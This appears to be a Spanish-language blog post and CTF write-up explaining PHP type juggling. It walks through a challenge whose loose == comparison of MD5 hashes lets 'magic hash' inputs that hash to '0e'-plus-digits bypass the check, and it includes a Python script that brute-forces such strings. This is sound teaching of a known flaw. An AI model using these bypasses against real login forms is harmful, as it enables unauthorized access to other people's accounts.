---
layout      : post
title       : "Type Juggling == PHP"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_banner.png
category    : [ article ]
tags        : [ type-juggling, PHP ]
---
Jugaremos con la **pobre validación** que se hace a veces en formularios o procesos de `PHP`, estos llevados a cabo con `==` o `!=`.

...

En este artículo vamos a explorar una vulnerabilidad en códigos de `PHP` llamada `Type Juggling`.

Aprovecharé un reto de un **CTF** creado por **CERT RCTS** para explicar este tipo de vuln:

🎲 **<u>Gracias</u>** [**<u>https://defendingthesoc.ctf.cert.rcts.pt/</u>**](https://defendingthesoc.ctf.cert.rcts.pt/).

...

Démosle...

1. [Descripción y exploración del reto](#desc-chall).
  * [Exploramos y entendemos el código **PHP** del reto](#code-analysis).
  * [Hacemos algunos testeos en el programa](#testing-chall).
2. [Empezamos a conocernos con el **Type Juggling**](#juggling).
  * [¿Qué jeso del **Type Juggling**?](#overview-juggling).
  * [Explotamos el **Type Juggling**](#exploit-juggling).
3. [Automatizamos la búsqueda de la cadena que genera el bypass (**Type Juggling**)](#py-juggling).
4. [Referencias](#refs).

...

# Vemos el reto [#](#desc-chall) {#desc-chall}

**Some type of juggling**...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_juggling_descriptionChall.png" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Entramos al sitio web y obtenemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_juggling_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos provee con el código fuente de la web y además nos indica que debemos usar el parámetro `hash` para obtener la flag.

El código fuente es este:

```php
<!DOCTYPE HTML>
<?php
    if(isset($_GET['source'])) {
        highlight_file(__FILE__);
        die();
    } else {
        $value = "240610708";
        if (isset($_GET['hash'])) {
            if ($_GET['hash'] === $value) {
                die('It is not THAT easy!');
            } 
            $hash = md5($_GET['hash']);
            $key = md5($value);
            if($hash == $key) {
                include('flag.php');
                print "Congratulations! Your flag is: $flag";
            } else {
                print "Flag not found!";
            }
        } 
    }
?>

<html>
  <head>
    <title>Challenge 1</title>
  </head>
  <body>
    <h2> Source code says it all</h2>
    <p>Try to get the flag using the 'hash' parameter</p>
    <a target="_blank" href="?source">See the source code</a>

  </body>
</html>
```

Bien, veamos rápidamente que hace el programa...

---

## Review del fuente <u>PHP</u> [📌](#code-analysis) {#code-analysis}

El código central en el que nos enfocaremos (y el importante) solo esta en esta parte:

```php
...
$value = "240610708";
if (isset($_GET['hash'])) {
    if ($_GET['hash'] === $value) {
        die('It is not THAT easy!');
    } 
    $hash = md5($_GET['hash']);
    $key = md5($value);
    if($hash == $key) {
        include('flag.php');
...
```

Inicialmente vemos que si le pasamos al parámetro `hash` el valor `240610708` nos saltaría `It is not THAT easy!`... Esto ya que válida si el valor y el **tipo de variable (int, float, string...)** son iguales.

* [Operadores de comparación en **PHP**](https://www.php.net/manual/es/language.operators.comparison.php).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_google_operatorsComparision.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

En caso de no ser iguales y no ver el error, toma el valor del parámetro y el de la variable `$value` y genera un **hash MD5** (***Message-Digest Algorithm 5***) para cada uno, que ese tipo de **hash** es muy usado para comprobar si un archivo ha sido modificado en alguna transmisión o proceso.

* [Wikipedia - MD5](https://es.wikipedia.org/wiki/MD5).
* [¿Qué es la función Hash del MD5 y es segura?](https://tecnonautas.net/que-es-la-funcion-hash-del-md5-y-es-segura/).

Y como paso final para obtener la flag, válida que los hashes resultantes sean iguales, peeeeeeeeeeero solo su valor, no su tipo.

🤾🏿 **ACÁ** es cuando empezamos a jugar...

---

## Hacemos algunos testeos [📌](#testing-chall) {#testing-chall}

Para entender que hace el código muuuucho mejor, creamos este con el que jugaremos toooodo el artículo.

```php
<?php
    $value = "240610708";
    $hash_get = "<vamos_a_jugar_con_esta_variable>";

    if ($hash_get === $value) {
        echo "It is not THAT easy!\n";
        exit(1);
    }

    $hash = md5($hash_get);
    $key = md5($value);

    echo "Value: " . $value . " - Hash: " . $key . "\n";
    echo "Hash_GET: " . $hash_get . " - Key: " . $hash . "\n";

    if ($key == $hash) {
        echo "\n[+] Iguales... 3st4{es_l4_fLA6}\n";
    } 
    else {
        echo "\n[-] No son iguales...\n";
    }
?>
```

Podemos pensar en enviar el valor `240610708` en el parámetro, peeero como hay una comprobación entre esas dos variables antes de las del hash, vamos a entrar al `exit(1)`:

```html
http://challenges.defsoc.tk:8080?hash=240610708
```

```php
$value = "240610708";
$hash_get = "240610708";
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_exit1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Así que F.

También podríamos pensar en enviar el valor **MD5** de `240610708`, claramente pasaríamos el primer `if`, pero ¿obtendríamos la flag? (¿qué dices tú antes de ver la respuesta?)

```bash
❱ echo -n "240610708" | md5sum
0e462097431906509019562988736854
```

```html
http://challenges.defsoc.tk:8080?hash=0e462097431906509019562988736854
```

```php
$value = "240610708";
$hash_get = "0e462097431906509019562988736854";
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_sendHASHofVALUE_notSAME.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Exacto, no son iguales, ya que esta generando un hash nuevo con el valor `0e462097431906509019562988736854`, así que tampoco es por acá...

Volviendo a la descripción del reto nos habla de -"algún tipo de **juggling**"- ¿khe? 

Investiguemos.

...

# Empezamos a jugar con el <u>Type Juggling</u> [#](#juggling) {#juggling}

...

## Hablamos un poquito de <u>Type Juggling</u> [📌](#overview-juggling) {#overview-juggling}

Buscando `juggling php` llegamos a esta brutal descripción del propio manual de **PHP**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_google_ManualPHPdescriptionJuggling.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, el primer párrafo ya nos explica que es eso del "**juggling**" (**type juggling**), básicamente es el juego entre tipos de variables, donde podemos definir una que sea tipo `int` (`$hola=1;`) pero después darle otro valor que cambie su tipo, por ejemplo `string` (`$hola="1";`) sin tener problemas.

Esto es interesante, porque si validamos los dos resultados, ¿serían iguales? 😮 Claramente no, ¿cierto? Una es un entero y la otra es una string... Validemos:

```php
<?php
    $holaINT = 1;
    $holaSTRING = "1";

    if ($holaINT == $holaSTRING) {
        echo "Son iguales :o\n";
    }
    else {
        echo "No son iguales :)\n";
    }
?>
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_validationINTwithSTRING.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

WTF, ¿kheeeeeeeeeeee? (antes ya expliqué la razón, pero ¿la recuerdas?).

Apoyado en varios recursos vamos a entender que pasa acá y como aprovecharnos de ello...

* [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09).
* [PHP Juggling type and magic hashes](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md).
* [Hashes "mágicos" en PHP (type jugling)](https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html).

Todo viene de la comparación pobre que se hace al usar `== o !=`, que estaría diciendo: "válida si las dos variables tienen el mismo valor", pero esta comparación no es estricta, por lo que no válida si las dos tienen el mismo tipo de variable, en este caso si `int == string`, esto no lo hace, por eso nos muestra que son iguales 🙃

...

Este comportamiento puede parecer a primera vista simplemente molesto, pero noooooooo, es causante de muuuuuuchos problemas y huecos en la seguridad...

El **peligro** puede llegar cuando aunque sea una de las variables que están siendo comparadas, **es manipulada por el usuario**. Y que en el peor de los casos ese usuario tenga pensamientos de atacante 😈

En nuestro caso tenemos un simple redirect hacia `flag.php` si logramos jugar correctamente con el **Type Juggling**, pero en el mundo real estos problemas se ven un montón en los `panel login`.

* [Acá un ejemplo de un código vulnerable que maneja **cookies**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#example-vulnerable-code).

Bueno, ya vimos que `1=="1"`, ¿pero qué pasa si validamos `1=="1 y más texto acá"`? 

Claramente no son iguales...

```php
<?php
    $holaINT = 1;
    $holaSTRING = "1 y más texto acá";

    if ($holaINT == $holaSTRING) {
        echo "Son iguales :o\n";
    }
    else {
        echo "No son iguales :)\n";
    }
?>
```

Ejecutamos:

```bash
❱ php test.php 
Son iguales :o
```

Jmmmmmmm, QUEEEEEEEEEEEEEE!! 

Lo que hace **PHP** acá es que como el primer carácter de la cadena es el número de la otra variable (`1`), **lo extrae** y los demás caracteres no le interesan, simplemente asimila que estamos comparando `1=="1"`, o sea la misma prueba que hicimos antes...

Obviamente si cambiamos la cadena a algo como:

```php
1=="a y más 1 texto acá" --> No son iguales
1=="2 y más texto acá"   --> No son iguales
```

Pues perfecto, ya entendimos como funciona un **Type Juggling**, veamos como obtener la flag jugando con él.

---

## Explotamos el <u>Type Juggling</u> para conseguir la <u>flag</u> [📌](#exploit-juggling) {#exploit-juggling}

Algo que entendimos es que podemos generar el bypass simplemente consiguiendo que las dos variables sean del mismo tipo más no con el mismo valor.

El **hash** con el que esta comparando nuestro input (`$_GET['hash']`) es este:

```php
0e462097431906509019562988736854
```

Que si usamos **PHP** para ver su tipo, nos mostrara que es una `string`, peeeeeeeeeero si **PHP** encuentra que el hash empieza con `0e` y el resto de su contenido es numérico, lo tratara como si su tipo de variable fuera `float` y no una `string` 😶

...

Con esto en mente, sabemos que tenemos que encontrar un valor que al obtener su **hash MD5**, primero empiece con `0e` y segundo que su contenido sean solo números... Así, solo así, haríamos que la validación de:

```php
<?php
    $value = "240610708";
    $hash_get = "<este_valor>";

    // md5($value) --> 0e462097431906509019562988736854 --> float
    // md5($hash_get) --> buscamos este valor numerico para que sea --> float

    // Y así compare (float==float) y logremos ver la flag
    if ($key == $hash) {
        echo "[+] Iguales... 3st4{es_l4_fLA6}\n";
    } 
?>
```

Uff algo difícil, ¿no?

En internet encontramos muchísimos valores con los que podríamos probar:

* [Acá hay una graaaaaaaan lista de hashes **MD5** flotantes](https://github.com/spaze/hashes/blob/master/md5.md).

Si tomamos alguno, por ejemplo: `NOOPCJF` y lo probamos en nuestro `test.php`, generamos el bypass:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_bypasswith_NOOPCFJ_WEB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

**Ya podríamos probar en la web y también obtendríamos la flag, solo que sería la del reto.**

Pero ta feo simplemente copiar y pegar, intentemos buscar una cadena nosotros mismos...

...

# Jugamos con <u>Python</u> para encontrar hash tipo <u>float</u> [#](#py-juggling) {#py-juggling}

Eso sí, debemos tener paciencia, ya que tenemos que generar dos cosas importantes:

* Un hash que inicie con `0e`.
* Que el contenido después del `0e` sea únicamente números.

Juguemos con cadenas **random**, así mismo será la posibilidad de obtener rápido algún hash con los criterios necesarios...

```py
#!/usr/bin/python3

import hashlib
import string
import random
import signal

# Funciones ---------------------------.
def def_handler(signal, frame):  # Controlamos salida con Ctrl+C
    print()
    exit()

signal.signal(signal.SIGINT, def_handler)

# Inicio del programa -----------------.
dic = string.ascii_letters + string.digits  # abc...xyzABC...XYZ0123456789
rand_index = list(range(7, 15))  # Generamos array: [7, 8 ... 13, 14]

while True:
    # Elegimos un numero aleatorio de nuestro array (entre 7 y 14), ese numero será el tamaño de la cadena.
    # Y la cadena se construye con caracteres aleatorios del diccionario.
    random_value = ''.join(random.choices(dic, k=random.choice(rand_index)))
    # Generamos hash MD5 correspondiente al valor random.
    hash_random_value = hashlib.md5(random_value.encode('utf-8')).hexdigest()

    # Si el hash empieza con 0e, jugamos...
    if hash_random_value.startswith("0e"):
        # Extraemos todo lo que esta despues del 0e y validamos si su contenido es numerico.
        if hash_random_value[2:].isnumeric():
            # Si es numerico, tenemos el hash del texto que PHP interpreta como flotante.
            print(f"[+] Texto: {random_value} - Hash: {hash_random_value}")
            break
```

> [jugl.py](https://github.com/lanzt/blog/blob/main/assets/scripts/articles/typejuggling/jugl.py)

Si lo ejecutamos (lo dicho, dándole tiempo) llegamos a obtener una cadena:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_juglPY_foundPOSSIBLEtext2bypass.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y si hacemos las respectivas prueeeebaas:

```php
$value = "240610708";·
$hash_get = "TP4KzMGZ";
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_bypassWITHstringOFpy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa, es válidooooooooooo, si lo probamos ahora contra el sitio real:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_bypassWITHscriptOFpy_flag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y listoos, hemos bypasseado la validación de hashes aprovechando la pobre comparación que `PHP` hace al usar `==` y no `===`. Esto para hacer un match en cuanto a los tipos de variables aunque el contenido de ellas sea distinto.

...

# Referencias [#](#refs) {#refs}

---

* [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/), whitehatsec.
* [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09), medium/swlh.
* [PHP Juggling type and magic hashes](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md), github/PayloadAllTheThings.
* [PDF - PHP Magic Tricks: Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), owasp.
* [Hashes "mágicos" en PHP (type jugling)](https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html), hackplayers.

...

Como dije al inicio, esta vulnerabilidad puede verse "pequeña" en estos entornos de -ver flags-, pero las pobres comparaciones (`==` o `!=`) se ven mucho en `logins`, ahí es donde reside el verdadero terror de esto, ya que podemos bypassear a lo loco.

Espero que haya sido de utilidad este post y como siempre digo, a seguir rompiendo de todoooooooooooooo (pero con cuidadito y con respeto).